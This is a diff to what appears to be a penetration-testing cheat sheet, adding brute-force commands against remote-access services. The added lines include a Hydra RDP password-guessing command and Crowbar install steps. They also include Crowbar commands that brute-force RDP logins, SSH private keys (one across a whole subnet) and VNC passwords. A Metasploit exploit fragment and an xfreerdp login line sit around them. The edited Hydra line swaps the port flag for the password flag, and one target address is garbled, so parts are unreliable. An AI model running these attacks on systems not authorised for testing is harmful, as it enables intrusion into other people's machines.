@@ -225,8 +225,34 @@ set RHOST [host]<br>
 set RPORT 3333 (if there is no port 3389 on the target)<br>
 exploit
 
-**Use hydra to brute force the login credentials**  
-hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt rdp://[host] -s 3389
+**Use hydra to brute force the login credentials**  <br>
+hydra -L /usr/share/wordlist/users.txt -P /usr/share/wordlist/passwords.txt rdp://[host] -p 3389
+
+**Crowbar**<br>
+git clone https://github.com/galkan/crowbar<br>
+cd crowbar/<br>
+pip3 install -r requirements.txt<br>
+
+RDP brute forcing a single IP address using a single username and a single password:<br>
+./crowbar.py -b rdp -s [host]/32 -u admin -c Aa123456<br>
+
+RDP brute forcing a single IP address using username list file and a single password:<br>
+./crowbar.py -b rdp -s [host]/32 -U ~/Desktop/userlist -c passw0rd<br>
+
+RDP brute forcing a single IP address using a single username and a password list:<br>
+./crowbar.py -b rdp -s [host]/32 -u localuser -C ~/Desktop/passlist<br>
+
+SSH key brute force attempt to a single IP address using a single username and a single private SSH key:<br>
+./crowbar.py -b sshkey -s [host]5/32 -u root -k ~/.ssh/id_rsa<br>
+
+SSH key brute force attempt to a single IP address using a single username and all the SSH keys in a folder:<br>
+./crowbar.py -b sshkey -s [host]/32 -u root -k ~/.ssh/<br>
+
+SSH key brute force attempt to a subnet using a single username and all the SSH keys in a folder in discovery mode:<br>
+./crowbar.py -b sshkey -s [host]/24 -u root -k ~/.ssh/ -d<br>
+
+VNC brute force attempt to a single IP address using a password file with specified port number:<br>
+./crowbar.py -b vnckey -s [host]/32 -p 5902 -k ~/.vnc/passwd<br>
 
 **Use RDP tools to connect to machine**     <br>
 xfreerdp /u:<username> /p:<password> /v:[host]:3389
